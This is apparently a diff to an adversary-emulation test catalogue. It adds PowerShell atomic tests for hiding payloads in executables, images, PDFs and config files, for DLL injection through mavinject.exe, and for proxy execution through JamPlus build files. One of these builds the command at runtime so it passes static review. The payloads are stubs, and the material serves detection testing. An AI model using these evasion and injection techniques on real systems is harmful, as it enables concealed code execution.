@@ -798,7 +798,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.620Z'
-      name: Embedded Payloads
+      name: 'Obfuscated Files or Information: Embedded Payloads'
       description: "Adversaries may embed payloads within other files to conceal malicious
         content from defenses. Otherwise seemingly benign files (such as scripts and
         executables) may be abused to carry and obfuscate malicious payloads and content.
@@ -837,7 +837,301 @@ stealth:
       - macOS
       - Windows
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1027.009
+    atomic_tests:
+    - name: Embed Simulated Payload Overlay in Carrier Executable
+      auto_generated_guid: '09b8f49c-58b8-49f4-bec7-d80d9163fb5c'
+      description: |
+        Simulates an adversary appending non-executing payload data as an overlay
+        to a carrier executable file. The appended data is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier executable file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.exe"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the carrier
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](0..127))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload overlay appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Simulated Payload Data in Carrier Image File
+      auto_generated_guid: 4f37ebea-bfaa-41c7-97bd-08bba0b8855d
+      description: |
+        Simulates an adversary appending non-executing payload data beyond the
+        declared content of a carrier image file. The payload is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier image file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.png"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the image
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](137,80,78,71,13,10,26,10,0,0,0,13))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload data appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Simulated Payload Data in Carrier PDF File
+      auto_generated_guid: 53b9902a-5ba5-4217-93e7-5d5571d163b4
+      description: |
+        Simulates an adversary appending non-executing payload data beyond the
+        declared content of a carrier PDF document. The payload is not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        carrier_path:
+          description: Path to the carrier PDF file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.pdf"
+        embedded_payload:
+          description: Simulated non-executing payload data appended to the PDF
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if (Test-Path "#{carrier_path}") { Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue }
+          [System.IO.File]::WriteAllBytes("#{carrier_path}", [byte[]](37,80,68,70,45,49,46,52,10))
+          [System.IO.File]::AppendAllText("#{carrier_path}", "#{embedded_payload}")
+          Write-Host "Embedded payload data appended to #{carrier_path}"
+        cleanup_command: 'Remove-Item "#{carrier_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in INI Configuration File
+      auto_generated_guid: 1920a80e-7376-4d9f-afe9-1c7f8b0882ba
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign INI configuration file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        config_path:
+          description: Path to the INI configuration carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_settings.ini"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $configContent = @"
+          [Settings]
+          application=legitimate-application
+          update_url=https://example.invalid
+          embedded_payload=#{embedded_payload}
+          "@
+          Set-Content -Path "#{config_path}" -Value $configContent -Force
+          Write-Host "Base64 payload string embedded in #{config_path}"
+        cleanup_command: 'Remove-Item "#{config_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in JSON Configuration File
+      auto_generated_guid: 025544b0-07ab-4fa3-97b3-17da2343a5eb
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign JSON configuration file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        config_path:
+          description: Path to the JSON configuration carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_settings.json"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $json = @{
+            application = "legitimate-application"
+            update_url = "https://example.invalid"
+            embedded_payload = "#{embedded_payload}"
+          } | ConvertTo-Json
+          Set-Content -Path "#{config_path}" -Value $json -Force
+          Write-Host "Base64 payload string embedded in #{config_path}"
+        cleanup_command: 'Remove-Item "#{config_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in XML Resource File
+      auto_generated_guid: 75edafa4-60c0-45bb-8900-d0805d9f029f
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        an otherwise benign XML resource file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        resource_path:
+          description: Path to the XML resource carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_resource.xml"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $xmlContent = @"
+          <?xml version="1.0" encoding="utf-8"?>
+          <configuration>
+            <application>legitimate-application</application>
+            <embeddedPayload>#{embedded_payload}</embeddedPayload>
+          </configuration>
+          "@
+          Set-Content -Path "#{resource_path}" -Value $xmlContent -Force
+          Write-Host "Base64 payload string embedded in #{resource_path}"
+        cleanup_command: 'Remove-Item "#{resource_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in CSV Data File
+      auto_generated_guid: 82084e9b-6e80-43b5-8716-5d6b36579f53
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a metadata field of an otherwise benign CSV data file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        csv_path:
+          description: Path to the CSV data carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_export.csv"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $csvContent = @"
+          id,name,metadata
+          1,legitimate-record,#{embedded_payload}
+          "@
+          Set-Content -Path "#{csv_path}" -Value $csvContent -Force
+          Write-Host "Base64 payload string embedded in #{csv_path}"
+        cleanup_command: 'Remove-Item "#{csv_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in PowerShell Script Carrier
+      auto_generated_guid: 8112d9ba-fac8-41c3-9aa9-595246be967a
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a PowerShell script file. The script is created but not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_path:
+          description: Path to the PowerShell script carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.ps1"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $scriptContent = "# Simulated embedded payload carrier`r`n" +
+                           "`$embeddedPayload = '#{embedded_payload}'"
+          Set-Content -Path "#{script_path}" -Value $scriptContent -Force
+          Write-Host "Base64 payload string embedded in #{script_path}"
+        cleanup_command: 'Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Base64 Payload String in Windows Script File Carrier
+      auto_generated_guid: f989c010-dc48-41e7-83b8-a0b781e76a0f
+      description: |
+        Simulates an adversary embedding a Base64-encoded payload string within
+        a Windows Script File. The script file is created but not executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_path:
+          description: Path to the Windows Script File carrier
+          type: path
+          default: "$env:TEMP\\T1027_009_carrier.wsf"
+        embedded_payload:
+          description: Base64-encoded simulated payload string
+          type: string
+          default: TVqQAAMAAAAEAAAA//8A
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $wsfContent = @"
+          <?xml version="1.0" encoding="utf-8"?>
+          <job>
+            <script language="VBScript">
+              Const embeddedPayload = "#{embedded_payload}"
+            </script>
+          </job>
+          "@
+          Set-Content -Path "#{script_path}" -Value $wsfContent -Force
+          Write-Host "Base64 payload string embedded in #{script_path}"
+        cleanup_command: 'Remove-Item "#{script_path}" -Force -ErrorAction SilentlyContinue
+
+          '
+    - name: Embed Hex-Encoded Simulated Shellcode String in Text Carrier
+      auto_generated_guid: a50df5f9-8961-4e0c-bb62-bf0614ddae94
+      description: |
+        Simulates an adversary embedding a hexadecimal representation of
+        simulated shellcode within an otherwise benign text file. The shellcode
+        representation is not decoded or executed.
+      supported_platforms:
+      - windows
+      input_arguments:
+        text_path:
+          description: Path to the text carrier file
+          type: path
+          default: "$env:TEMP\\T1027_009_notes.txt"
+        embedded_payload:
+          description: Hex-encoded simulated shellcode representation
+          type: string
+          default: 9090909031c050682f2f7368
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $textContent = @"
+          Meeting notes
+          Reference: #{embedded_payload}
+          "@
+          Set-Content -Path "#{text_path}" -Value $textContent -Force
+          Write-Host "Hex-encoded simulated shellcode string embedded in #{text_path}"
+        cleanup_command: 'Remove-Item "#{text_path}" -Force -ErrorAction SilentlyContinue
+
+          '
   T1564.012:
     technique:
       type: attack-pattern
@@ -1860,7 +2154,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.622Z'
-      name: Mavinject
+      name: 'System Binary Proxy Execution: Mavinject'
       description: "Adversaries may abuse mavinject.exe to proxy execution of malicious
         code. Mavinject.exe is the Microsoft Application Virtualization Injector,
         a Windows utility that can inject code into external processes as part of
@@ -1890,7 +2184,239 @@ stealth:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '3.0'
-    atomic_tests: []
+      identifier: T1218.013
+    atomic_tests:
+    - name: T1218.013 - Inject DLL into Target Process via Mavinject /INJECTRUNNING
+      auto_generated_guid: beb540df-3de7-41c8-b863-6c26c1f87dff
+      description: 'Simulates an adversary utilizing mavinject.exe to inject a dynamic-link
+        library into a running process using the /INJECTRUNNING parameter.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$dll = "$env:TEMP\mavinject_stub.dll"; $proc = Start-Process notepad.exe
+          -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; mavinject.exe $proc.Id
+          /INJECTRUNNING $dll; Write-Host "[+] Mavinject DLL injection executed."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\mavinject_stub.dll"; if (Test-Path $dll)
+          { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process
+          -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up mavinject process artifacts."
+
+          '
+    - name: T1218.013 - Mavinject Process Injection with Module Index Offset Parsing
+      auto_generated_guid: 36524689-9bb3-4333-8851-72907ff75522
+      description: 'Simulates an adversary utilizing mavinject.exe to perform module
+        allocation and injection passing module index offsets.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$dll = "$env:TEMP\offset_stub.dll"; $proc = Start-Process notepad.exe
+          -PassThru; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; mavinject.exe $proc.Id
+          /INJECTRUNNING $dll 0x1000; Write-Host "[+] Mavinject offset injection executed."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\offset_stub.dll"; if (Test-Path $dll)
+          { Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process
+          -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up offset injection artifacts."
+
+          '
+    - name: T1218.013 - Proxy Execution via Mavinject /STARTAPP Virtual Package Trigger
+      auto_generated_guid: 768f26a1-0aef-4544-9aef-fcbf05980294
+      description: 'Simulates an adversary leveraging mavinject.exe /STARTAPP to launch
+        an arbitrary executable under an App-V subsystem context.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id
+          /STARTAPP "$env:SystemRoot\System32\cmd.exe"; Write-Host "[+] Mavinject
+          App-V STARTAPP execution simulated."
+
+          '
+        cleanup_command: 'Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue;
+          Write-Host "[+] Cleaned up STARTAPP target processes."
+
+          '
+    - name: T1218.013 - Mavinject Injection Using Alternate Environment Executable
+        Path
+      auto_generated_guid: 4640d18e-f45e-49bc-b0f6-0efd958ae1db
+      description: 'Simulates invoking mavinject.exe via explicit system environment
+        variable string concatenation to execute process injection.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$mavPath = Join-Path $env:SystemRoot "System32\mavinject.exe"; $dll
+          = "$env:TEMP\env_stub.dll"; $proc = Start-Process notepad.exe -PassThru;
+          if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll, [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0))
+          }; & $mavPath $proc.Id /INJECTRUNNING $dll; Write-Host "[+] Executed Mavinject
+          from explicit path variable."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\env_stub.dll"; if (Test-Path $dll) { Remove-Item
+          $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad
+          -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up path variable
+          test artifacts."
+
+          '
+    - name: T1218.013 - Mavinject Process Injection from Staged Temporary Subdirectory
+      auto_generated_guid: bc0c990b-2f7f-4e7a-ab6a-82f27cd78a10
+      description: 'Simulates staging a DLL inside a deeply nested temp directory
+        before passing it to mavinject.exe for process injection.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$stageDir = "$env:TEMP\MavStage"; if (-not (Test-Path $stageDir))
+          { New-Item -Path $stageDir -ItemType Directory -Force | Out-Null }; $dll
+          = "$stageDir\staged_payload.dll"; [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)); $proc = Start-Process
+          notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host
+          "[+] Staged directory Mavinject payload injected."
+
+          '
+        cleanup_command: '$stageDir = "$env:TEMP\MavStage"; if (Test-Path $stageDir)
+          { Remove-Item $stageDir -Recurse -Force -ErrorAction SilentlyContinue };
+          Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host
+          "[+] Cleaned up staging directory."
+
+          '
+    - name: T1218.013 - Mavinject Command Interpreter Subshell Invocation
+      auto_generated_guid: 321694f9-3fe8-4d3f-9d8b-471a90e2282f
+      description: 'Simulates calling mavinject.exe through a cmd.exe subshell wrapper
+        to evaluate command interpreter execution chains.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$dll = "$env:TEMP\cmd_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $proc = Start-Process
+          notepad.exe -PassThru; cmd.exe /c "mavinject.exe $($proc.Id) /INJECTRUNNING
+          $dll"; Write-Host "[+] Cmd-wrapped Mavinject process injection executed."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\cmd_stub.dll"; if (Test-Path $dll) { Remove-Item
+          $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad
+          -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up cmd subshell
+          artifacts."
+
+          '
+    - name: T1218.013 - Sequential Dual-Process Mavinject Injection Trigger
+      auto_generated_guid: 661feb02-ac4e-4a69-9de3-90e10b61e4a2
+      description: 'Simulates an adversary executing back-to-back mavinject.exe injections
+        into two separate target processes.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$dll = "$env:TEMP\dual_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $p1 = Start-Process
+          notepad.exe -PassThru; $p2 = Start-Process notepad.exe -PassThru; mavinject.exe
+          $p1.Id /INJECTRUNNING $dll; mavinject.exe $p2.Id /INJECTRUNNING $dll; Write-Host
+          "[+] Sequential dual-process injection completed."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\dual_stub.dll"; if (Test-Path $dll) {
+          Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name
+          notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          dual process injection targets."
+
+          '
+    - name: T1218.013 - Mavinject Execution with App-V Environment Policy Switch
+      auto_generated_guid: adf0d823-d65b-4920-aba0-558ca5038c7d
+      description: 'Simulates an operator abusing mavinject.exe policy configuration
+        switches to override App-V isolation boundaries.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$proc = Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id
+          /SET_POLICY 0; Write-Host "[+] Mavinject set policy switch simulated."
+
+          '
+        cleanup_command: 'Stop-Process -Name notepad -Force -ErrorAction SilentlyContinue;
+          Write-Host "[+] Cleaned up policy switch target process."
+
+          '
+    - name: T1218.013 - Mavinject Process Injection targeting App Container Host
+      auto_generated_guid: 7dfb443f-f199-4d6d-81ab-0909c31e7773
+      description: 'Simulates injecting a custom payload module into a running target
+        process via mavinject.exe.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$dll = "$env:TEMP\host_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
+          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $proc = Start-Process
+          notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING $dll; Write-Host
+          "[+] Mavinject injection into host process completed."
+
+          '
+        cleanup_command: '$dll = "$env:TEMP\host_stub.dll"; if (Test-Path $dll) {
+          Remove-Item $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name
+          notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up
+          target process artifacts."
+
+          '
+    - name: T1218.013 - Mavinject Injection with NTFS Alternate Data Stream (ADS)
+        Carrier
+      auto_generated_guid: 0d9bf912-4e16-42e8-a13e-8652fd16538a
+      description: 'Simulates an adversary passing a payload stored inside an NTFS
+        Alternate Data Stream to mavinject.exe for process injection.
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: '$carrier = "$env:TEMP\legit_host.txt"; if (Test-Path $carrier) {
+          Remove-Item $carrier -Force -ErrorAction SilentlyContinue }; Set-Content
+          -Path $carrier -Value "Standard text container"; $ads = $carrier + ":mavinject_payload.dll";
+          Set-Content -Path $ads -Value "MZ_SIMULATED_DLL_HEADER_STREAM"; $proc =
+          Start-Process notepad.exe -PassThru; mavinject.exe $proc.Id /INJECTRUNNING
+          $ads; Write-Host "[+] ADS payload passed to Mavinject executed."
+
+          '
+        cleanup_command: '$carrier = "$env:TEMP\legit_host.txt"; if (Test-Path $carrier)
+          { Remove-Item $carrier -Force -ErrorAction SilentlyContinue }; Stop-Process
+          -Name notepad -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned
+          up ADS Mavinject artifacts."
+
+          '
   T1036.005:
     technique:
       type: attack-pattern
@@ -8623,7 +9149,7 @@ stealth:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.645Z'
-      name: JamPlus
+      name: 'Trusted Developer Utilities Proxy Execution: JamPlus'
       description: |-
         Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)
 
@@ -8643,7 +9169,312 @@ stealth:
       - Windows
       x_mitre_version: '2.0'
       x_mitre_remote_support: false
-    atomic_tests: []
+      identifier: T1127.003
+    atomic_tests:
+    - name: JamPlus proxy execution - launch calc.exe via Jamfile.jam action
+      auto_generated_guid: 5f7f863b-b6e5-4eb3-98af-9844d194137e
+      description: |
+        Writes a minimal Jamfile.jam whose build action shell-executes calc.exe, then invokes jam.exe against it. Mirrors the reported abuse pattern of using JamPlus's build actions to proxy execution of an arbitrary binary from a reputable developer tool.
+        Expected output: calc.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test1"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              calc.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - launch PowerShell via Jamfile.jam action
+      auto_generated_guid: 51b6913b-f96a-4d18-9802-41d4c5d4f995
+      description: |
+        Writes a Jamfile.jam whose build action invokes powershell.exe to write a marker file, simulating an adversary using JamPlus to proxy execution of a PowerShell payload rather than a GUI binary.
+        Expected output: a marker file is created by the powershell.exe process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test2"
+        marker_file:
+          description: File the proxied PowerShell process will create
+          type: path
+          default: "$env:TEMP\\T1127.003_marker.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions RunPayload
+          {
+              powershell.exe -NoProfile -Command "Set-Content -Path '#{marker_file}' -Value 'T1127.003 test'"
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{marker_file}" -Force -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload injected via command-line variable substitution
+      auto_generated_guid: 077fb22c-fe92-4abd-aecf-31339324864b
+      description: |
+        Writes an innocuous-looking Jamfile.jam whose action body only references a variable, with no payload embedded in the file itself. The actual command is supplied entirely via a jam -s command-line variable at invocation time, so the Jamfile would pass a static content review while the executed command is assembled only at runtime. Simulates a supply-chain-style abuse pattern where a pre-approved, benign-looking build script is weaponized purely through its invocation parameters.
+        Expected output: calc.exe launches as a child process of jam.exe, despite the Jamfile containing no reference to calc.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test3b"
+        payload_command:
+          description: Command injected at invocation time via the PAYLOAD variable
+          type: string
+          default: calc.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              $(PAYLOAD)
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -s"PAYLOAD=#{payload_command}" payload
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - command execution via explicitly named Jamfile
+      auto_generated_guid: cab43461-dbf0-4786-a9bc-857067272f8d
+      description: |
+        Writes a build-instructions file under a non-default filename and invokes JamPlus against it explicitly using the -f flag, rather than relying on JamPlus's default Jamfile.jam auto-discovery. Demonstrates a distinct invocation path that may evade detections keyed only on the default filename.
